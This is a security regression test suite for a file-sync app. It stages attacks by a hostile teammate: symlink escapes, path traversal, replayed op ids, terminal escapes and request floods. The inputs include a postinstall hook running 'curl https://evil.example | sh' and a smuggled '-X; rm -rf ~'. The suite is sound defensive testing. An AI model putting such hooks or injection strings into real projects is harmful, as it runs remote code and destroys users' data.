// Security regression tests: each one is an attack attempted against a local server and
// clients. See SECURITY_AUDIT.md for the findings they pin down.
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { request } from 'node:http'
import { randomBytes } from 'node:crypto'
import { existsSync, lstatSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, realpathSync, renameSync, rmSync, statSync, symlinkSync, writeFileSync } from 'node:fs'
import { homedir, tmpdir } from 'node:os'
import { dirname, join } from 'node:path'
import { startServer } from '../server/server.ts'
import { clientKey } from '../server/server.ts'
import { LocalState, type Project } from '../client-core/state.ts'
import { ProjectSync, call, createProject, joinProject } from '../client-core/engine.ts'
import { Hub, freeFolder, keepLocal, previewShare, restore, setShared, parseInvite } from '../client-core/hub.ts'
import { openArgs } from '../client-core/ui-server.ts'
import { cleanPath, ignoreRules, DEFAULT_IGNORE } from '../shared/paths.ts'
import { sha256 } from '../shared/protocol.ts'

const FAST = { liveMs: 60, calmMs: 1000, reconnectMaxMs: 300 }
const sleep = (ms: number) => new Promise(r => setTimeout(r, ms))
async function until(what: string, cond: () => boolean, ms = 10_000) {
  const end = Date.now() + ms
  while (!cond()) {
    if (Date.now() > end) throw new Error(`timed out waiting for: ${what}`)
    await sleep(25)
  }
}
const tmp = (prefix = 'synchack-sec-') => realpathSync(mkdtempSync(join(tmpdir(), prefix)))

/** A server and two members' engines on separate folders. */
async function pair(quota?: number) {
  const dir = tmp()
  const server = await startServer({ port: 0, dataDir: join(dir, 'server'), quota })
  const mac = async (i: number, user: string, p?: Project) => {
    const state = new LocalState(join(dir, `home-${i}`))
    state.setMeta('user', user)
    const root = join(dir, user)
    mkdirSync(root, { recursive: true })
    const project = p ? await joinProject(state, server.url, p.code, root) : await createProject(state, server.url, root, 'demo')
    const sync = new ProjectSync(state, project, FAST).start()
    await sync.idle()
    return { state, root: project.root, p: project, sync }
  }
  const a = await mac(0, 'victim')
  const b = await mac(1, 'attacker', a.p)
  return {
    dir, server, a, b,
    async close() {
      await Promise.all([a.sync.stop(), b.sync.stop()])
      await server.close()
      rmSync(dir, { recursive: true, force: true })
    },
  }
}

const raw = (url: string, method: string, path: string, headers: Record<string, string>, body?: string) =>
  new Promise<number>((ok, fail) => {
    const u = new URL(url)
    const req = request({ host: u.hostname, port: u.port, path, method, headers }, res => (res.resume(), ok(res.statusCode ?? 0)))
    req.on('error', fail)
    req.end(body)
  })

// ── secrets ──────────────────────────────────────────────────────────────

test('SEC-01 a teammate cannot un-ignore secrets through the shared .synchackignore', async () => {
  const t = await pair()
  try {
    writeFileSync(join(t.a.root, '.env'), 'STRIPE_KEY=sk_live_victim\n')
    writeFileSync(join(t.a.root, 'deploy.pem'), '-----BEGIN PRIVATE KEY-----\n')
    // the attacker publishes rules that re-include every secret pattern
    writeFileSync(join(t.b.root, '.synchackignore'), '!.env\n!*.pem\n!.env.*\n')
    await until('the victim receives the hostile rules', () => existsSync(join(t.a.root, '.synchackignore')))
    await sleep(800)
    await t.a.sync.idle()
    const paths = t.server.store.heads(t.a.p.id).map(h => h.path)
    assert.ok(!paths.includes('.env'), '.env must never reach the server')
    assert.ok(!paths.includes('deploy.pem'), 'keys must never reach the server')
    assert.equal(existsSync(join(t.b.root, '.env')), false)
  } finally {
    await t.close()
  }
})

test('SEC-02 secret file names are ignored by default, in any letter case', () => {
  const ig = ignoreRules()
  for (const p of ['.env', 'api/.ENV', '.Env.local', 'id_rsa', 'keys/id_ed25519', 'cert.P12', 'store.pfx', 'server.KEY', '.ssh/config', '.aws/credentials', '.netrc'])
    assert.ok(ig(p), `${p} must not sync`)
  for (const p of ['.env.example', 'src/env.ts', 'keys.ts', 'id_rsa.pub', 'docs/ssh.md']) assert.ok(!ig(p), `${p} should sync`)
  assert.ok(DEFAULT_IGNORE.includes('id_rsa'))
})

test('SEC-03 sharing or joining into a home folder, a system folder or a parent of home is refused', async () => {
  const dir = tmp()
  const server = await startServer({ port: 0, dataDir: join(dir, 'server') })
  const state = new LocalState(join(dir, 'home'))
  try {
    for (const bad of [homedir(), dirname(homedir()), '/', '/Applications', '/System', join(homedir(), 'Library'), join(homedir(), 'Library', 'Application Support')])
      await assert.rejects(createProject(state, server.url, bad, 'x'), /can't share|cannot share|not a project/i, bad)
    assert.equal(state.projects().length, 0)
  } finally {
    await server.close()
    rmSync(dir, { recursive: true, force: true })
  }
})

test('SEC-04 previewing a huge folder stays bounded instead of freezing synchack', () => {
  const root = tmp()
  try {
    for (let d = 0; d < 30; d++) {
      mkdirSync(join(root, `d${d}`))
      for (let f = 0; f < 1000; f++) writeFileSync(join(root, `d${d}`, `f${f}`), '')
    }
    const t0 = performance.now()
    const p = previewShare(root)
    assert.ok(performance.now() - t0 < 3000, 'took too long')
    assert.ok(p.truncated, 'a 30 000-file walk must stop early and say so')
  } finally {
    rmSync(root, { recursive: true, force: true })
  }
})

// ── protocol and authorization ───────────────────────────────────────────

test("SEC-05 a member cannot squat another member's operation ids (replay across devices)", async () => {
  const t = await pair()
  try {
    writeFileSync(join(t.a.root, 'notes.md'), 'victim notes\n')
    await until('notes reach the attacker', () => existsSync(join(t.b.root, 'notes.md')))
    await t.a.sync.idle()
    const st = t.a.state.file(t.a.p.id, 'notes.md')
    // the victim's next deletion of notes.md has a predictable op id: the attacker claims it first
    const victimOp = sha256(`${t.a.state.device}\nnotes.md\n${st.version}\n${st.hash}\nnull`)
    const junk = Buffer.from('attacker content\n')
    await call(t.b.p, 'PUT', `/blobs/${sha256(junk)}`, junk)
    const { results } = await call(t.b.p, 'POST', '/ops', { ops: [{ opId: victimOp, path: 'other.md', baseVersion: 0, baseHash: null, hash: sha256(junk) }] })
    assert.equal(results[0].status, 'ok')
    rmSync(join(t.a.root, 'notes.md'))
    await until('the deletion reaches the server', () => t.server.store.head(t.a.p.id, 'notes.md').hash === null)
    assert.equal(existsSync(join(t.a.root, 'notes.md')), false, 'the victim must not get the attacker content written in place')
  } finally {
    await t.close()
  }
})

test('SEC-06 names and paths with control characters (terminal escapes) are rejected', async () => {
  assert.throws(() => cleanPath('evil\x1b]52;c;aGk=\x07.md'))
  assert.throws(() => cleanPath('line\nbreak.md'))
  const dir = tmp()
  const server = await startServer({ port: 0, dataDir: join(dir, 'server') })
  try {
    const post = (body: object) => fetch(`${server.url}/api/projects`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) })
    assert.equal((await post({ name: 'demo', device: 'd1', user: 'Nolann\x1b[2J', deviceName: 'Mac' })).status, 400)
    assert.equal((await post({ name: 'demo\x07', device: 'd1', user: 'ok', deviceName: 'Mac' })).status, 400)
  } finally {
    await server.close()
    rmSync(dir, { recursive: true, force: true })
  }
})

test('SEC-07 invite codes carry at least 39 bits, and IPv6 guessers are limited per /64', async () => {
  const dir = tmp()
  const server = await startServer({ port: 0, dataDir: join(dir, 'server') })
  try {
    const r = await (await fetch(`${server.url}/api/projects`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ name: 'demo', device: 'd', user: 'u', deviceName: 'Mac' }) })).json()
    assert.match(r.code, /^[A-Z2-9]{4}-[A-Z2-9]{4}$/)
    assert.equal(parseInvite(`${r.code.toLowerCase().replace('-', '')}@10.0.0.2:8787`).code.length >= 8, true)
    // 31^8 ≈ 2^39.6
    assert.ok(8 * Math.log2(31) > 39)
    assert.equal(clientKey('2001:db8:1:2:aaaa::1'), clientKey('2001:db8:1:2:ffff:1:2:3'))
    assert.notEqual(clientKey('2001:db8:1:2::1'), clientKey('2001:db8:1:3::1'))
    assert.equal(clientKey('::ffff:192.168.1.20'), '192.168.1.20')
  } finally {
    await server.close()
    rmSync(dir, { recursive: true, force: true })
  }
})

test('SEC-08 every project route refuses a member of another project', async () => {
  const dir = tmp()
  const server = await startServer({ port: 0, dataDir: join(dir, 'server') })
  try {
    const mk = async (device: string) => (await (await fetch(`${server.url}/api/projects`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ name: device, device, user: device, deviceName: 'Mac' }) })).json()) as { projectId: string; token: string }
    const A = await mk('alice'), B = await mk('bob')
    const blob = Buffer.from('secret of B\n')
    await call({ server: server.url, id: B.projectId, token: B.token, cert: null }, 'PUT', `/blobs/${sha256(blob)}`, blob)
    const asA = async (method: string, path: string, body?: unknown) => {
      const res = await fetch(`${server.url}/api/p/${B.projectId}${path}`, { method, headers: { authorization: `Bearer ${A.token}`, 'content-type': 'application/json' }, body: body === undefined ? undefined : JSON.stringify(body) })
      return res.status
    }
    for (const [m, p, b] of [
      ['GET', '/heads'], ['GET', '/members'], ['GET', '/conflicts'], ['GET', '/conflicts/abc'], ['GET', `/history?path=x`],
      ['GET', `/blobs/${sha256(blob)}`], ['PUT', `/blobs/${sha256(Buffer.from('x'))}`], ['POST', '/blobs/missing', { hashes: [] }],
      ['POST', '/ops', { ops: [] }], ['POST', '/conflicts/abc/vote', { choice: 'A' }], ['POST', '/conflicts/abc/resolve', { choice: 'A' }],
      ['POST', '/invite', {}], ['DELETE', '/members/bob'],
    ] as [string, string, unknown?][])
      assert.equal(await asA(m, p, b), 401, `${m} ${p}`)
    const ws = new WebSocket(`${server.url.replace('http', 'ws')}/api/p/${B.projectId}/ws?token=${A.token}`)
    const closed = await new Promise(r => ((ws.onerror = () => r('refused')), (ws.onopen = () => r('open'))))
    assert.equal(closed, 'refused')
  } finally {
    await server.close()
    rmSync(dir, { recursive: true, force: true })
  }
})

test('SEC-09 malformed requests are refused without crashing the server', async () => {
  const dir = tmp()
  const server = await startServer({ port: 0, dataDir: join(dir, 'server') })
  try {
    const A = (await (await fetch(`${server.url}/api/projects`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ name: 'demo', device: 'a', user: 'a', deviceName: 'Mac' }) })).json()) as { projectId: string; token: string }
    const auth = { authorization: `Bearer ${A.token}`, 'content-type': 'application/json' }
    const base = `/api/p/${A.projectId}`
    assert.equal(await raw(server.url, 'POST', `${base}/ops`, auth, '{not json'), 400)
    assert.equal(await raw(server.url, 'POST', `${base}/ops`, auth, '[]'), 400)
    assert.equal(await raw(server.url, 'POST', `${base}/ops`, auth, JSON.stringify({ ops: 'x' })), 400)
    assert.equal(await raw(server.url, 'DELETE', `${base}/members/%E0%A4%A`, auth), 400, 'bad percent-encoding is a 400, not a 500')
    const { results } = await call({ server: server.url, id: A.projectId, token: A.token, cert: null }, 'POST', '/ops', {
      ops: [
        { opId: 'a', path: '../escape', baseVersion: 0, baseHash: null, hash: null },
        { opId: 'b', path: '/etc/passwd', baseVersion: 0, baseHash: null, hash: null },
        { opId: 'c', path: 'a/../../b', baseVersion: 0, baseHash: null, hash: null },
        { opId: 'd', path: 'x', baseVersion: -1, baseHash: null, hash: null },
        { opId: 'e', path: 'x', baseVersion: 0, baseHash: 'zz', hash: null },
        { opId: 'f'.repeat(500), path: 'x', baseVersion: 0, baseHash: null, hash: null },
        { opId: 'g', path: 'x'.repeat(5000), baseVersion: 0, baseHash: null, hash: null },
        { opId: 'h', path: 'x', baseVersion: 0, baseHash: null, hash: sha256('never uploaded') },
        null, 42, 'op',
      ],
    })
    assert.ok(results.every((r: { status: string }) => r.status === 'error'), JSON.stringify(results.map((r: { status: string }) => r.status)))
    assert.equal((await fetch(`${server.url}/health`)).status, 200, 'still alive')
  } finally {
    await server.close()
    rmSync(dir, { recursive: true, force: true })
  }
})

test('SEC-10 storage quota cannot be dodged by streaming without a content length', async () => {
  const dir = tmp()
  const server = await startServer({ port: 0, dataDir: join(dir, 'server'), quota: 1000 })
  try {
    const A = (await (await fetch(`${server.url}/api/projects`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ name: 'demo', device: 'a', user: 'a', deviceName: 'Mac' }) })).json()) as { projectId: string; token: string }
    const big = Buffer.alloc(5000, 7)
    const u = new URL(server.url)
    const status = await new Promise<number>((ok, fail) => {
      const req = request({ host: u.hostname, port: u.port, method: 'PUT', path: `/api/p/${A.projectId}/blobs/${sha256(big)}`, headers: { authorization: `Bearer ${A.token}`, 'transfer-encoding': 'chunked' } }, res => (res.resume(), ok(res.statusCode ?? 0)))
      req.on('error', fail)
      req.write(big.subarray(0, 2500))
      req.end(big.subarray(2500))
    })
    assert.equal(status, 507)
    assert.equal(server.store.hasBlob(A.projectId, sha256(big)), false)
  } finally {
    await server.close()
    rmSync(dir, { recursive: true, force: true })
  }
})

// ── local filesystem ─────────────────────────────────────────────────────

test('SEC-11 remote writes never pass through symlinks: a symlinked file or folder in the project', async () => {
  const t = await pair()
  try {
    const outside = join(t.dir, 'outside')
    mkdirSync(outside)
    writeFileSync(join(outside, 'authorized_keys'), 'original\n')
    symlinkSync(join(outside, 'authorized_keys'), join(t.a.root, 'keys.txt')) // a file symlink
    symlinkSync(outside, join(t.a.root, 'dotssh')) // a folder symlink
    writeFileSync(join(t.b.root, 'keys.txt'), 'attacker key\n')
    mkdirSync(join(t.b.root, 'dotssh'))
    writeFileSync(join(t.b.root, 'dotssh', 'authorized_keys'), 'attacker key\n')
    await until('the server has both', () => t.server.store.head(t.a.p.id, 'dotssh/authorized_keys').hash !== null && t.server.store.head(t.a.p.id, 'keys.txt').hash !== null)
    await sleep(800)
    assert.equal(readFileSync(join(outside, 'authorized_keys'), 'utf8'), 'original\n', 'nothing written outside the project')
    assert.ok(lstatSync(join(t.a.root, 'keys.txt')).isSymbolicLink(), 'the symlink is left alone')
  } finally {
    await t.close()
  }
})

test('SEC-12 files behind a symlinked folder are never read and uploaded', async () => {
  const t = await pair()
  try {
    mkdirSync(join(t.a.root, 'conf'))
    writeFileSync(join(t.a.root, 'conf', 'id'), 'project file\n')
    await until('conf/id is synced', () => t.server.store.head(t.a.p.id, 'conf/id').hash !== null)
    await t.a.sync.stop()
    // conf becomes a link to a folder holding a secret with the same name (e.g. ~/.ssh)
    const outside = join(t.dir, 'secrets')
    mkdirSync(outside)
    writeFileSync(join(outside, 'id'), 'PRIVATE KEY\n')
    rmSync(join(t.a.root, 'conf'), { recursive: true })
    symlinkSync(outside, join(t.a.root, 'conf'))
    t.a.sync = new ProjectSync(t.a.state, t.a.state.project(t.a.p.id)!, FAST).start()
    await sleep(1500)
    const h = t.server.store.head(t.a.p.id, 'conf/id')
    assert.ok(!h.hash || t.server.store.readBlob(t.a.p.id, h.hash).toString() !== 'PRIVATE KEY\n', 'the secret must not be uploaded')
  } finally {
    await t.close()
  }
})

test('SEC-13 restore, keep-my-file and share toggles never follow a symlink out of the project', async () => {
  const t = await pair()
  try {
    const outside = join(t.dir, 'zshrc')
    writeFileSync(outside, 'original\n')
    writeFileSync(join(t.a.root, 'notes.md'), 'v1\n')
    await until('notes synced', () => t.server.store.head(t.a.p.id, 'notes.md').hash !== null)
    await t.a.sync.stop()
    rmSync(join(t.a.root, 'notes.md'))
    symlinkSync(outside, join(t.a.root, 'notes.md'))
    await assert.rejects(restore(t.a.p, 'notes.md', { version: 1, force: true }), /symlink|not a regular file/i)
    assert.equal(readFileSync(outside, 'utf8'), 'original\n')
    // .synchackignore as a link to a file outside
    symlinkSync(outside, join(t.a.root, '.synchackignore'))
    assert.throws(() => setShared(t.a.root, 'x', false, false), /symlink|not a regular file/i)
    assert.equal(readFileSync(outside, 'utf8'), 'original\n')
    // keep-my-file on a conflict whose path is a link to a secret
    await assert.rejects(keepLocal(t.a.p, { id: 'nope', path: 'notes.md' } as never), /symlink|not a regular file/i)
  } finally {
    await t.close()
  }
})

test('SEC-14 a symlinked .synchack folder is refused instead of deleting its target', () => {
  const dir = tmp()
  try {
    const state = new LocalState(join(dir, 'home'))
    const root = join(dir, 'proj')
    const victim = join(dir, 'precious')
    mkdirSync(join(victim, 'tmp'), { recursive: true })
    writeFileSync(join(victim, 'tmp', 'keep.txt'), 'x')
    mkdirSync(root)
    symlinkSync(victim, join(root, '.synchack'))
    const p: Project = { id: 'p', name: 'proj', root, server: 'http://127.0.0.1:9', token: 't', code: 'c', mode: 'paused', seq: 0, cert: null }
    state.addProject(p)
    assert.throws(() => new ProjectSync(state, p, FAST).start(), /symlink/)
    assert.ok(existsSync(join(victim, 'tmp', 'keep.txt')), 'the link target is untouched')
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})

test('SEC-15 a deleted file arrives in the local trash, not oblivion', async () => {
  const t = await pair()
  try {
    writeFileSync(join(t.a.root, 'work.md'), 'two days of work\n')
    await until('work reaches the attacker', () => existsSync(join(t.b.root, 'work.md')))
    rmSync(join(t.b.root, 'work.md'))
    await until('the deletion reaches the victim', () => !existsSync(join(t.a.root, 'work.md')))
    const trash = join(t.a.root, '.synchack', 'trash')
    const found = readdirSync(trash, { recursive: true }).map(String).filter(f => f.endsWith('work.md'))
    assert.equal(found.length, 1)
    assert.equal(readFileSync(join(trash, found[0]), 'utf8'), 'two days of work\n')
  } finally {
    await t.close()
  }
})

test('SEC-16 opening a synced folder never launches it (an .app bundle from a teammate)', () => {
  assert.deepEqual(openArgs('/p/Tools.app', true), ['-R', '/p/Tools.app'])
  assert.deepEqual(openArgs('/p/readme.md', false), ['-R', '/p/readme.md'])
  // project folders are named after the project: a hostile name must not make a bundle
  for (const name of ['Evil.app', 'x.command', 'a.terminal', '../../etc', '.hidden'])
    assert.doesNotMatch(freeFolder(name).split('/').pop()!, /\.(app|command|terminal)$|^\.|\//, name)
})

test('SEC-17 local state is private to this user', () => {
  const dir = tmp()
  try {
    const state = new LocalState(join(dir, 'home'))
    state.setMeta('x', 'y')
    assert.equal(statSync(join(dir, 'home')).mode & 0o077, 0, 'state folder readable by other users')
    assert.equal(statSync(join(dir, 'home', 'state.db')).mode & 0o077, 0, 'tokens readable by other users')
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})

test('SEC-18 the hub only resolves invitation targets it actually discovered', async () => {
  const dir = tmp()
  const state = new LocalState(join(dir, 'home'))
  const hub = await new Hub(state, { port: 0, discover: false }).start()
  try {
    mkdirSync(join(dir, 'proj'))
    const p = await hub.create(join(dir, 'proj'))
    await assert.rejects(hub.invite(p.id, '-X; rm -rf ~'), /not nearby|not on this network/i)
  } finally {
    await hub.close()
    rmSync(dir, { recursive: true, force: true })
  }
})

test('SEC-19 .git and .synchack are unreachable in any letter case (APFS is case-insensitive)', () => {
  for (const p of ['.GIT/config', 'sub/.Git/hooks/pre-commit', '.SYNCHACK/tmp/x', '.git']) assert.throws(() => cleanPath(p), p)
  assert.ok(ignoreRules()('.GIT/config'))
  assert.ok(ignoreRules()('NODE_MODULES/x.js'))
})

test('SEC-20 an anonymous oversized request cannot crash the server', async () => {
  const dir = tmp()
  const server = await startServer({ port: 0, dataDir: join(dir, 'server') })
  try {
    const u = new URL(server.url)
    for (const path of ['/api/join', '/api/projects', '/inbox']) {
      await new Promise<void>(ok => {
        const req = request({ host: u.hostname, port: u.port, method: 'POST', path, headers: { 'content-type': 'application/json', 'transfer-encoding': 'chunked' } }, res => (res.resume(), res.on('end', ok)))
        req.on('error', () => ok())
        for (let i = 0; i < 12; i++) req.write(Buffer.alloc(256 * 1024, 32))
        req.end()
      })
    }
    await sleep(300)
    assert.equal((await fetch(`${server.url}/health`)).status, 200, 'still serving')
  } finally {
    await server.close()
    rmSync(dir, { recursive: true, force: true })
  }
})

// ── teammates: names, case twins, invitations, resources, risky changes ──

const post = async (url: string, path: string, body: object, token?: string) =>
  fetch(`${url}${path}`, { method: 'POST', headers: { 'content-type': 'application/json', ...(token ? { authorization: `Bearer ${token}` } : {}) }, body: JSON.stringify(body) })

test('SEC-21 a teammate cannot take the display name of another, in any case or width', async () => {
  const dir = tmp()
  const server = await startServer({ port: 0, dataDir: join(dir, 'server') })
  try {
    const A = await (await post(server.url, '/api/projects', { name: 'demo', device: 'victim', user: 'Nolann', deviceName: 'Mac' })).json()
    for (const [device, user] of [['b', 'nolann'], ['c', 'ＮＯＬＡＮＮ'], ['d', 'Oliver']]) assert.equal((await post(server.url, '/api/join', { code: A.code, device, user, deviceName: 'Mac' })).status, 200)
    assert.deepEqual(server.store.members(A.projectId).map(m => m.name), ['Nolann', 'nolann 2', 'ＮＯＬＡＮＮ 3', 'Oliver'])
  } finally {
    await server.close()
    rmSync(dir, { recursive: true, force: true })
  }
})

test('SEC-22 files that differ only in letter case are refused (one file on a Mac), and a case-only rename still syncs', async () => {
  const t = await pair()
  try {
    writeFileSync(join(t.a.root, 'Readme.md'), 'hello\n')
    await until('Readme.md reaches the teammate', () => existsSync(join(t.b.root, 'Readme.md')))
    // a modified client adds README.md next to it: on the victim's Mac that would overwrite Readme.md
    const evil = Buffer.from('overwritten\n')
    await call(t.b.p, 'PUT', `/blobs/${sha256(evil)}`, evil)
    const { results } = await call(t.b.p, 'POST', '/ops', { ops: [{ opId: 'x', path: 'README.md', baseVersion: 0, baseHash: null, hash: sha256(evil) }] })
    assert.equal(results[0].status, 'error')
    assert.match(results[0].error, /letter case/)
    // a real rename (delete + create in one round) still goes through
    renameSync(join(t.a.root, 'Readme.md'), join(t.a.root, 'README.md'))
    await until('the rename reaches the teammate', () => readdirSync(t.b.root).includes('README.md') && !readdirSync(t.b.root).includes('Readme.md'))
    assert.equal(readFileSync(join(t.b.root, 'README.md'), 'utf8'), 'hello\n')
    assert.equal(t.a.sync.errors.size, 0, JSON.stringify([...t.a.sync.errors]))
  } finally {
    await t.close()
  }
})

test('SEC-23 someone on the Wi-Fi cannot flood the invitation inbox or replace the invitations of others', async () => {
  const dir = tmp()
  const hub = await new Hub(new LocalState(join(dir, 'home')), { port: 0, discover: false }).start()
  try {
    const card = (source: string, from: string) => ({ from, project: 'demo', address: '10.0.0.2:8787', pin: null, salt: randomBytes(16).toString('hex'), mac: randomBytes(32).toString('hex'), source })
    const real = card('10.0.0.2', 'Oliver (MacBook-Air)')
    hub['received'](real)
    for (let i = 0; i < 30; i++) hub['received'](card('10.0.0.66', i % 2 ? 'Oliver (MacBook-Air)' : `Team ${i} (Mac)`))
    hub['received'](real) // the same invitation again
    assert.equal(hub.inbox.filter(i => i.source === '10.0.0.66').length, 3, 'one address keeps 3 cards at most')
    assert.deepEqual(hub.inbox.filter(i => i.source === '10.0.0.2').map(i => i.mac), [real.mac], "Oliver's real invitation is still there, once")
  } finally {
    await hub.close()
    rmSync(dir, { recursive: true, force: true })
  }
})

test('SEC-24 a member cannot exhaust the server: sockets, reconnect loops and change floods are capped per device', async () => {
  const dir = tmp()
  const server = await startServer({ port: 0, dataDir: join(dir, 'server'), memberLimits: { ops: 10, connects: 5, windowMs: 60_000 } })
  const socks: WebSocket[] = []
  try {
    const A = await (await post(server.url, '/api/projects', { name: 'demo', device: 'a', user: 'a', deviceName: 'Mac' })).json()
    const open = () =>
      new Promise<WebSocket>((ok, fail) => {
        const ws = new WebSocket(`${server.url.replace('http', 'ws')}/api/p/${A.projectId}/ws?token=${A.token}`)
        ws.onopen = () => (socks.push(ws), ok(ws))
        ws.onerror = () => fail(new Error('refused'))
      })
    for (let i = 0; i < 5; i++) await open()
    await sleep(200)
    assert.equal(socks.filter(ws => ws.readyState === WebSocket.OPEN).length, 3, 'the oldest sockets give way')
    await assert.rejects(open(), /refused/, 'connects are limited per window')
    const ops = (n: number) => post(server.url, `/api/p/${A.projectId}/ops`, { ops: Array.from({ length: n }, (_, i) => ({ opId: `o${n}-${i}`, path: `f${i}`, baseVersion: 0, baseHash: null, hash: null })) }, A.token)
    assert.equal((await ops(10)).status, 200)
    assert.equal((await ops(1)).status, 429, 'changes are limited per window, counted per file')
    assert.equal((await fetch(`${server.url}/health`)).status, 200)
  } finally {
    for (const ws of socks) ws.close()
    await server.close()
    rmSync(dir, { recursive: true, force: true })
  }
})

test("SEC-25 a teammate's change to a file your tools run, or to the sync rules, waits for review", async () => {
  const t = await pair()
  try {
    writeFileSync(join(t.a.root, 'notes.md'), 'mine\n')
    await until('notes reach the attacker', () => existsSync(join(t.b.root, 'notes.md')))
    writeFileSync(join(t.b.root, 'package.json'), '{"scripts":{"postinstall":"curl https://evil.example | sh"}}\n')
    await until('package.json is flagged on the victim', () => t.a.sync.flagged.has('package.json'))
    assert.match(t.a.sync.flagged.get('package.json')!.author ?? '', /^attacker/)
    writeFileSync(join(t.b.root, '.synchackignore'), '*.md\n')
    await until('the new rules are flagged on the victim', () => t.a.sync.flagged.has('.synchackignore'))
    assert.match(t.a.sync.flagged.get('.synchackignore')!.why, /^1 file no longer syncs?$/)
    assert.equal(t.b.sync.flagged.size, 0, 'your own changes are not flagged')
  } finally {
    await t.close()
  }
})
